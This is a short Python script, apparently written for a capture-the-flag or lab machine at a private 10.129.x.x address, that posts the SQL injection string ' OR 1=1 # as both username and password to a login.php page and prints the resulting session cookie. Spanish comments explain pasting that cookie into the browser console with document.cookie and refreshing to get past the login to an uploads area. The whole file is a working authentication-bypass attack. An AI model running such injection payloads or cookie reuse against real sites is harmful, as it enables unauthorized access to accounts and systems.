#!/usr/bin/env python3

import requests
url = "http://10.129.1.129/login.php"

s = requests.Session()
#las variables username y password la obtuvo desde la consola del navegador metiendo creds malas
r = s.post(url, data = {
		"username": "' OR 1=1 \#",
		"password": "' OR 1=1 \#",

	})
print(r.text)
print(s.cookies)
#la salida del ultimo comando se usa en la consola del navegador asi:
#document.cookie = "PHPSESSIONID=<pegar aca el contenido de print s.cookies) y dar enter
#luego presionar f5 y ya me deberia de dejar pasar al uploads
s.close()
